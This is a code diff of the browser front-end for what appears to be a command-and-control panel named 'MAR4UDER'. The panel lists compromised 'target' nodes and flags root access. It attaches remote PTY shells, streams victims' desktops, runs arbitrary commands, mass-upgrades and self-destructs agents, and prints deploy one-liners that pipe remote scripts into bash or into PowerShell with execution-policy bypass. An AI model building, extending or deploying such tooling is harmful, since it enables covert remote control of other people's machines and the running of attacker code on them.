       row.onclick = () => selectNode(n);
+      row.ondblclick = () => { selectNode(n); switchView('shell'); };
 
-      const statusHtml = n.is_online ? '<span class="ne-online">[ONLINE]</span>' : '<span class="ne-offline">[OFFLINE]</span>';
-      const rootHtml = n.is_root ? '<span class="ne-root">root #</span>' : `${n.username || 'user'} $`;
+      const statusStr = n.is_online ? '<span class="r-online">[ONLINE]</span>' : '<span class="r-offline">[OFFLINE]</span>';
+      const userStr = n.is_root ? '<span class="r-root">root #</span>' : `${n.username || 'user'} $`;
 
       row.innerHTML = `
-        <div class="ne-top">
-          <div><span class="ne-slot">#${n.slot || 1}</span><span class="ne-host">${n.hostname || n.id}</span></div>
-          <div>${statusHtml}</div>
-        </div>
-        <div class="ne-bot">
-          <span>${n.ip || '0.0.0.0'}</span>
-          <span>${rootHtml}</span>
-          <span>${n.ping_ms || 0}ms</span>
-        </div>
+        <div class="r-slot">[#${n.slot || (idx + 1)}]</div>
+        <div class="r-id">${n.hostname || n.id}</div>
+        <div>${n.ip || '0.0.0.0'}</div>
+        <div>${userStr}</div>
+        <div>${n.os || 'Linux'} / ${n.arch || 'x64'}</div>
+        <div>${n.ping_ms || 0} ms</div>
+        <div>${statusStr}</div>
       `;
       container.appendChild(row);
     });
 
-    if (!selectedNode && filtered.length > 0) {
-      selectNode(filtered[0]);
+    if (!selectedNode && nodes.length > 0) {
+      selectNode(nodes[0]);
     }
   }
 
   function selectNode(n) {
     selectedNode = n;
-    document.getElementById('active-target-badge').innerText = `[TARGET: ${n.hostname || n.id} // SLOT #${n.slot || 1} // ${n.ip}]`;
-    document.getElementById('term-prompt').innerText = `m4r:${n.hostname || n.id}>`;
-    document.querySelectorAll('.node-entry').forEach(el => el.classList.remove('active'));
-    renderNodes();
-    attachTerminal(n.id);
-  }
-
-  // TABS
-  function switchTab(num) {
-    currentTab = num;
-    const pages = ['page-term', 'page-stream', 'page-files', 'page-ops'];
-    document.querySelectorAll('.tab-item').forEach((b, idx) => {
-      if (idx === num - 1) b.classList.add('active');
-      else b.classList.remove('active');
-    });
-    document.querySelectorAll('.tab-page').forEach((p, idx) => {
-      if (idx === num - 1) p.classList.add('active');
-      else p.classList.remove('active');
-    });
-
-    if (num === 2 && selectedNode) {
-      const port = selectedNode.webrtc_port || (1984 + (selectedNode.slot || 1) - 1);
-      const vp = document.getElementById('stream-viewport-box');
-      vp.innerHTML = `<video-stream src="http://${window.location.hostname}:${port}/api/ws?src=desktop_slot_${selectedNode.slot || 1}"></video-stream>`;
+    document.getElementById('active-target-txt').innerText = `[TARGET: #${n.slot || 1} ${n.hostname || n.id} (${n.ip})]`;
+    document.getElementById('cli-prompt-label').innerText = `m4r:${n.hostname || n.id}>`;
+    renderTable();
+    if (currentView === 'shell') {
+      attachPty(n.id);
     }
   }
 
-  // PTY TERMINAL
-  function attachTerminal(nodeId) {
+  // NAVIGATION
+  function switchView(viewName) {
+    currentView = viewName;
+    const map = {
+      'nodes': {btnIdx: 0, paneId: 'view-nodes'},
+      'shell': {btnIdx: 1, paneId: 'view-shell'},
+      'stream': {btnIdx: 2, paneId: 'view-stream'},
+      'files': {btnIdx: 3, paneId: 'view-files'},
+      'tools': {btnIdx: 4, paneId: 'view-tools'}
+    };
+
+    document.querySelectorAll('.nav-btn').forEach((b, idx) => {
+      if (idx === map[viewName].btnIdx) b.classList.add('active');
+      else b.classList.remove('active');
+    });
+
+    document.querySelectorAll('.view-pane').forEach(p => p.classList.remove('active'));
+    document.getElementById(map[viewName].paneId).classList.add('active');
+
+    if (viewName === 'shell' && selectedNode) {
+      attachPty(selectedNode.id);
+    } else if (viewName === 'stream' && selectedNode) {
+      const port = selectedNode.webrtc_port || (1984 + (selectedNode.slot || 1) - 1);
+      const box = document.getElementById('stream-box-container');
+      box.innerHTML = `<video-stream src="http://${window.location.hostname}:${port}/api/ws?src=desktop_slot_${selectedNode.slot || 1}"></video-stream>`;
+    }
+  }
+
+  // PTY WEBSOCKET
+  function attachPty(nodeId) {
     if (termWS) {
       termWS.close();
       termWS = null;
     }
-    const container = document.getElementById('terminal-container');
-    container.innerText = `[*] Connecting PTY to node [${nodeId}]...\n`;
+    const screen = document.getElementById('pty-terminal-screen');
+    screen.innerText = `[*] Connecting PTY WebSocket to node [${nodeId}]...\n`;
 
     const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     termWS = new WebSocket(`${wsProto}//${window.location.host}/ws/terminal?node=${nodeId}`);
 
     termWS.onopen = () => {
-      container.innerText += `[+] PTY session established.\n`;
+      screen.innerText += `[+] PTY attached. Type in prompt or click macros.\n`;
     };
     termWS.onmessage = (e) => {
-      container.innerText += e.data;
-      container.scrollTop = container.scrollHeight;
+      screen.innerText += e.data;
+      screen.scrollTop = screen.scrollHeight;
     };
     termWS.onclose = () => {
-      container.innerText += `\n[-] Session detached.`;
+      screen.innerText += `\n[-] PTY session closed.`;
     };
   }
 
-  function sendTerminalCommand(cmd) {
+  function sendPtyKey(k) {
     if (termWS && termWS.readyState === WebSocket.OPEN) {
-      termWS.send(cmd);
+      termWS.send(k);
     }
   }
 
-  function clearTerminal() {
-    document.getElementById('terminal-container').innerText = '';
+  function clearScreen() {
+    document.getElementById('pty-terminal-screen').innerText = '';
   }
 
-  function handleCliInput(e) {
+  // PROMPT PARSER (DIRECT CLI EMULATION)
+  function handlePromptKey(e) {
     if (e.key === 'Enter') {
-      const input = document.getElementById('cli-cmd-field');
+      const input = document.getElementById('cli-input');
       const val = input.value.trim();
-      if (!val) return;
-      sendTerminalCommand(val + '\n');
       input.value = '';
+      if (!val) return;
+      runCommandDirect(val);
     }
   }
 
-  // KEYBOARD DISPATCHER
-  document.getElementById('terminal-container').addEventListener('keydown', (e) => {
-    if (!termWS || termWS.readyState !== WebSocket.OPEN) return;
-    if (e.key === 'Backspace') {
-      sendTerminalCommand('\x7f');
-      e.preventDefault();
-    } else if (e.key === 'Enter') {
-      sendTerminalCommand('\r');
-      e.preventDefault();
-    } else if (e.key === 'ArrowUp') {
-      sendTerminalCommand('\x1b[A');
-      e.preventDefault();
-    } else if (e.key === 'ArrowDown') {
-      sendTerminalCommand('\x1b[B');
-      e.preventDefault();
-    } else if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
-      sendTerminalCommand(e.key);
-      e.preventDefault();
-    }
-  });
+  async function runCommandDirect(cmdStr) {
+    const parts = cmdStr.split(' ');
+    const op = parts[0].toLowerCase();
 
+    if (op === 'help' || op === '?') {
+      alert(`MAR4UDER CLI COMMANDS:\n- 1..9 : Switch/attach to node #\n- nodes : Show node matrix\n- attach <#> : Attach PTY shell\n- stream <#> : Open desktop stream\n- exec <cmd> : Run command on target\n- ping : Ping target RTT\n- update : Upgrade target binary\n- update-all : Mass upgrade fleet\n- deploy : Show curl one-liners\n- clear : Clear terminal screen`);
+      return;
+    }
+
+    if (op === 'nodes' || op === 'list' || op === 'f1') {
+      switchView('nodes');
+      return;
+    }
+    if (op === 'shell' || op === 'pty' || op === 'f2') {
+      switchView('shell');
+      return;
+    }
+    if (op === 'stream' || op === 'vnc' || op === 'f3') {
+      if (parts[1]) {
+        const slotNum = parseInt(parts[1]);
+        const found = nodes.find(n => n.slot === slotNum);
+        if (found) selectNode(found);
+      }
+      switchView('stream');
+      return;
+    }
+    if (op === 'files' || op === 'f4') {
+      switchView('files');
+      return;
+    }
+    if (op === 'tools' || op === 'f5') {
+      switchView('tools');
+      return;
+    }
+
+    // Direct Slot Number: e.g. "1" or "2"
+    const num = parseInt(op);
+    if (!isNaN(num) && num >= 1 && num <= nodes.length) {
+      const target = nodes.find(n => n.slot === num) || nodes[num - 1];
+      if (target) {
+        selectNode(target);
+        switchView('shell');
+        return;
+      }
+    }
+
+    if (op === 'attach' && parts[1]) {
+      const slotNum = parseInt(parts[1]);
+      const found = nodes.find(n => n.slot === slotNum || n.id === parts[1]);
+      if (found) {
+        selectNode(found);
+        switchView('shell');
+        return;
+      }
+    }
+
+    if (currentView === 'shell') {
+      sendPtyKey(cmdStr + '\n');
+    } else {
+      // Execute via RPC
+      if (!selectedNode) return;
+      switchView('tools');
+      const box = document.getElementById('tools-output-box');
+      box.innerText = `[*] Executing: ${cmdStr} on [${selectedNode.id}] ...\n`;
+      try {
+        const res = await fetch(`/api/v1/nodes/${selectedNode.id}/exec`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({cmd: cmdStr})
+        });
+        const data = await res.json();
+        box.innerText = data.output || JSON.stringify(data, null, 2);
+      } catch(err) {
+        box.innerText = `[-] Error: ${err.message}`;
+      }
+    }
+  }
+
+  // KEYBOARD SHORTCUTS
   window.addEventListener('keydown', (e) => {
-    if (document.activeElement && (document.activeElement.tagName === 'INPUT' || document.activeElement.id === 'terminal-container')) return;
-    if (e.key === '1') switchTab(1);
-    if (e.key === '2') switchTab(2);
-    if (e.key === '3') switchTab(3);
-    if (e.key === '4') switchTab(4);
+    if (e.key === 'F1') { e.preventDefault(); switchView('nodes'); }
+    if (e.key === 'F2') { e.preventDefault(); switchView('shell'); }
+    if (e.key === 'F3') { e.preventDefault(); switchView('stream'); }
+    if (e.key === 'F4') { e.preventDefault(); switchView('files'); }
+    if (e.key === 'F5') { e.preventDefault(); switchView('tools'); }
   });
 
-  // OPS & ACTIONS
-  async function pingActiveTarget() {
-    if (!selectedNode) return;
-    const log = document.getElementById('ops-log-output');
-    log.innerText = `[*] Probing RTT to node [${selectedNode.id}]...\n`;
-    const t0 = performance.now();
-    try {
-      await fetch(`/api/v1/nodes/${selectedNode.id}/ping`, {method: 'POST'});
-      const dt = (performance.now() - t0).toFixed(1);
-      log.innerText += `[+] Pong received in ${dt} ms.`;
-    } catch(err) {
-      log.innerText += `[-] Ping error: ${err.message}`;
+  // TOOLS
+  async function runTool(t) {
+    const box = document.getElementById('tools-output-box');
+    if (t === 'ping' && selectedNode) {
+      box.innerText = `[*] Probing RTT to [${selectedNode.id}]...\n`;
+      const t0 = performance.now();
+      try {
+        await fetch(`/api/v1/nodes/${selectedNode.id}/ping`, {method: 'POST'});
+        const dt = (performance.now() - t0).toFixed(1);
+        box.innerText += `[+] Pong received in ${dt} ms.`;
+      } catch(e) { box.innerText += `[-] Error: ${e.message}`; }
+    } else if (t === 'update' && selectedNode) {
+      box.innerText = `[*] Upgrading binary on [${selectedNode.id}]...\n`;
+      try {
+        const res = await fetch(`/api/v1/nodes/${selectedNode.id}/update`, {method: 'POST'});
+        box.innerText += await res.text();
+      } catch(e) { box.innerText += `[-] Error: ${e.message}`; }
+    } else if (t === 'update-all') {
+      if (!confirm('Upgrade all online nodes?')) return;
+      box.innerText = `[*] Dispatched mass upgrade...\n`;
+      try {
+        const res = await fetch('/api/v1/nodes/update_all', {method: 'POST'});
+        box.innerText += JSON.stringify(await res.json(), null, 2);
+      } catch(e) { box.innerText += `[-] Error: ${e.message}`; }
+    } else if (t === 'deploy') {
+      const host = window.location.host;
+      box.innerText = `AGENT ONE-LINERS:\n- Linux Target: curl -s http://${host}/i | bash\n- Operator Admin: curl -s http://${host}/m4r | bash\n- Windows CLI: powershell -ep bypass -c "iwr -useb http://${host}/m4r.ps1 | iex"`;
+    } else if (t === 'uninstall' && selectedNode) {
+      if (!confirm(`Self-destruct agent on [${selectedNode.id}]?`)) return;
+      try {
+        await fetch(`/api/v1/nodes/${selectedNode.id}/uninstall`, {method: 'POST'});
+        box.innerText = `[+] Uninstall command dispatched to ${selectedNode.id}`;
+        refreshAll();
+      } catch(e) { box.innerText = `[-] Error: ${e.message}`; }
     }
-  }
-
-  async function updateActiveTarget() {
-    if (!selectedNode) return;
-    const log = document.getElementById('ops-log-output');
-    log.innerText = `[*] Dispatched remote self-upgrade on node [${selectedNode.id}]...\n`;
-    try {
-      const res = await fetch(`/api/v1/nodes/${selectedNode.id}/update`, {method: 'POST'});
-      const data = await res.text();
-      log.innerText += data;
-    } catch(err) {
-      log.innerText += `[-] Update failed: ${err.message}`;
-    }
-  }
-
-  async function updateAllNodes() {
-    if (!confirm('Broadcast remote upgrade to ALL registered nodes?')) return;
-    try {
-      const res = await fetch('/api/v1/nodes/update_all', {method: 'POST'});
-      const data = await res.json();
-      alert(`Upgrade dispatched: ${JSON.stringify(data)}`);
-    } catch(e) {
-      alert(`Error: ${e.message}`);
-    }
-  }
-
-  async function uninstallActiveTarget() {
-    if (!selectedNode) return;
-    if (!confirm(`Self-destruct and wipe agent on [${selectedNode.id}]?`)) return;
-    try {
-      await fetch(`/api/v1/nodes/${selectedNode.id}/uninstall`, {method: 'POST'});
-      alert(`Uninstall dispatched on node ${selectedNode.id}`);
-      refreshData();
-    } catch(err) {
-      alert(`Error: ${err.message}`);
-    }
-  }
-
-  // MODAL
-  function openDeployModal() {
-    const host = window.location.host;
-    document.getElementById('snip-linux').innerText = `curl -s http://${host}/i | bash`;
-    document.getElementById('snip-m4r').innerText = `curl -s http://${host}/m4r | bash`;
-    document.getElementById('snip-ps').innerText = `powershell -ep bypass -c "iwr -useb http://${host}/m4r.ps1 | iex"`;
-    document.getElementById('deploy-modal').classList.add('open');
-  }
-  function closeDeployModal() {
-    document.getElementById('deploy-modal').classList.remove('open');
   }
 
   // INIT
-  refreshData();
-  setInterval(refreshData, 3000);
+  refreshAll();
+  setInterval(refreshAll, 3000);
 </script>
 </body>
 </html>
